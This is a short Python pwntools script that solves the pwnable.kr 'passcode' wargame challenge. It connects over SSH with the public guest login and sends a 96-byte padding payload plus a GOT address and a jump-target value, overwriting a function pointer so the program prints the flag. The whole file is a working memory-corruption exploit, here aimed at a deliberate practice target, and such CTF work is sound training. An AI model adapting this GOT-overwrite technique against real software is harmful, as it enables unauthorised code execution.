from pwn import *
import struct


def main():
    session = ssh(user="passcode", host="pwnable.kr", port=2222, password="guest")
    con = session.run(['./passcode'])
    payload1 = b"A" * 96 + struct.pack("I", 0x804a004)
    payload2 = str(0x080485d7).encode()
    log.info("payload1=%s", payload1)
    log.info("payload2=%s", payload2)
    con.sendline(payload1)
    con.sendline(payload2)
    res = con.recvall(timeout=1)
    if type(res) != None:
        res_iter = res.split(b"\n")
        f = False
        for i in res_iter:
            if f:
                log.success("flag=%s",i)
                return
            if b"OK" in i:
                f = True
            
    log.failure("flag is not found")
    con.close()
    return



if __name__ == "__main__":
    main()
